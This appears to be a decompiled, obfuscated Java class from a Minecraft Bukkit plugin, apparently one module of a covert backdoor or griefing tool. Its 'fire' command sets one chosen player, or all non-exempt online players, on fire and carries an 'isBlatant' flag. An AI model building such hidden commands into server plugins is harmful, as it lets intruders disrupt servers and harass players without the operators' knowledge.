/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class FireCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllllIlIIIIlIIlIIllIII, String lllllllllllllllIlIIIIlIIlIIlIlll, String[] lllllllllllllllIlIIIIlIIlIIlIllI, Player lllllllllllllllIlIIIIlIIlIIlIlIl) {
        if (lllllllllllllllIlIIIIlIIlIIlIllI.length <= 1) {
            lllllllllllllllIlIIIIlIIlIIlIlIl.sendMessage(Settings.USAGE("fire <player>"));
        } else if (lllllllllllllllIlIIIIlIIlIIlIllI[1].equals("*")) {
            for (Player lllllllllllllllIlIIIIlIIlIIlllIl : Bukkit.getOnlinePlayers()) {
                if (lllllllllllllllIlIIIIlIIlIIllIII.lite.contains(lllllllllllllllIlIIIIlIIlIIlllIl.getName())) continue;
                lllllllllllllllIlIIIIlIIlIIlllIl.setFireTicks(600);
            }
            lllllllllllllllIlIIIIlIIlIIlIlIl.sendMessage(Settings.PREFIX("Everyone was set on fire!"));
        } else {
            Player lllllllllllllllIlIIIIlIIlIIllIlI = Bukkit.getServer().getPlayer(lllllllllllllllIlIIIIlIIlIIlIllI[1]);
            if (lllllllllllllllIlIIIIlIIlIIllIlI == null) {
                lllllllllllllllIlIIIIlIIlIIlIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllllIlIIIIlIIlIIlIllI[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                lllllllllllllllIlIIIIlIIlIIllIlI.setFireTicks(600);
                lllllllllllllllIlIIIIlIIlIIlIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(lllllllllllllllIlIIIIlIIlIIllIlI.getName()).append(Settings.WHITE).append(" was set on fire!"))));
            }
        }
    }

    public FireCommand() {
        FireCommand lllllllllllllllIlIIIIlIIlIllIIIl;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

